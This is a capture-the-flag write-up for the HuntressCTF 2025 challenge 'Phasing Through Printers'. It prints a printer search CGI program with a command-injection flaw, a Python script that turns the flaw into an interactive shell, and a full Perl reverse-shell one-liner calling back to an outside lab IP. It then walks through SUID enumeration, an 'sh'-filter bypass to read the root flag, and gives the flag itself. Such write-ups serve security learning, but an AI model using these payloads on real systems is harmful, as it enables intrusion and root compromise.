---
title: HuntressCTF 2025 Phasing Through Printers
draft: false
tags:
  - ctf
  - web-exploitation
---

# Phasing Through Printers

> I found this printer on the network, and it seems to be running... a weird web page... to search for drivers? Here is some of the code I could dig up.

We are given a webserver where you can make a simple query. Additionally, we're given some source code, and specifically, `cgi-bin/search.c`. 

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

void urldecode2(char *dst, char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else if (*src == '+') {
                        *dst++ = ' ';
                        src++;
                } else {
                        *dst++ = *src++;
                }
        }
        *dst++ = '\0';
}
int main ()
{
   char *env_value;
   char *save_env;

   printf("Content-type: text/html\n\n");
   save_env = getenv("QUERY_STRING"); 
   if (strncmp(save_env, "q=", 2) == 0) {
        memmove(save_env, save_env + 2, strlen(save_env + 2) + 1);
      
    }

   char *decoded = (char *)malloc(strlen(save_env) + 1);

   urldecode2(decoded, save_env);


   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
   size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
   char *combinedString = (char *)malloc(totalLength);
   if (combinedString == NULL) {
        printf("Failed to allocate memory");
        return 1;
   }
   strcpy(combinedString, first_part);
   strcat(combinedString, decoded);
   strcat(combinedString, last_part);
   FILE *fp;
   char buffer[1024];

   fp = popen(combinedString, "r");
   if (fp == NULL) {
      printf("Error running command\n");
      return 1;
   }
   while (fgets(buffer, sizeof(buffer), fp) != NULL) {
      printf("%s<br>", buffer);
   }

   pclose(fp);

   fflush(stdout);
   free(combinedString);
   free(decoded);
   exit (0);
}
```

The issue here is command injection. Specifically, it creates a string, which is basically `grep -R -i <our input> /var/www/html/data/printer_drivers.txt` and passes it to `popen()`. We can execute arbitrary commands by setting our input to something like `;whoami #`. I created a simple shell:

```python
import urllib.parse
import requests

def url_encode(string):
    return urllib.parse.quote(string)

session = requests.Session()

while True:
    user_cmd = input("> ").strip()
    if user_cmd == "exit":
        break
    url_encoded = url_encode(user_cmd)
    resp = session.get(f"http://10.0.30.209/cgi-bin/search.cgi?q=hello%3B{url_encoded}")
    print(resp.text.replace("<br>", "\n"))
```

and then used the following reverse shell payload:

```perl
perl -e 'use Socket;$i="10.200.3.52";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

This allowed me to drop a reverse shell. I then upgraded to `bash`, and began enumerating for a privilege escalation. Using `find / -perm -u=s -type f 2>/dev/null` to find SUID binaries, we find `/usr/local/bin/admin_help` which appears to be custom. I exfiltrated the binary by hexdumping it, copying it to my local machine, and converting the hexdump back to bytes-- then opening it in Binary Ninja. 

```
000010d0  int32_t main(int32_t argc, char** argv, char** envp)

000010d9      int32_t rbx = 4
000010e9      setuid(uid: geteuid())
000010f5      puts(str: "Your wish is my command... maybe…")
000010fd      while (true)
00001104          if (removeStringFromFile(&sh_string) == 0)
00001127              puts(str: "Bad String in File.")
0000112c              break
00001106          int32_t temp0_1 = rbx
00001106          rbx = rbx - 1
00001109          if (temp0_1 == 1)
00001112              system(line: "chmod +x /tmp/wish.sh && /tmp/wi…")
00001112              break
0000111f      return 0

00001220  int64_t removeStringFromFile(char* arg1)

0000123f      int64_t filename
0000123f      __builtin_strcpy(dest: &filename, src: "/tmp/wish.sh")
00001258      FILE* fp = fopen(filename: &filename, mode: &data_2004)
00001260      if (fp == 0)
000012b5          perror(s: "Error opening original file")
00001260      else
0000127e          char* i
0000127e          do
00001293              void buf
00001293              if (fgets(buf: &buf, n: 0x400, fp) == 0)
00001298                  fclose(fp)
000012ad                  return 1
00001276              i = strstr(&buf, arg1)
0000127e          while (i == 0)
000012c7      return 0

```

This binary is relatively straight forward. It opens `/tmp/wish.sh` and checks if the string `sh` is anywhere inside it. If so, it fails, and otherwise, it executes it using `system()`. So, we just need to create a payload that can read the flag, without containing `sh`. 

```bash
cat > /tmp/wish.sh << 'EOF' #!/usr/bin/python3 import os os.system('cat /root/flag.txt') EOF

chmod +x /tmp/wish.sh

/usr/local/bin/admin_help
```

and we get the flag: `flag{93541544b91b7d2b9d61e90becbca309}`.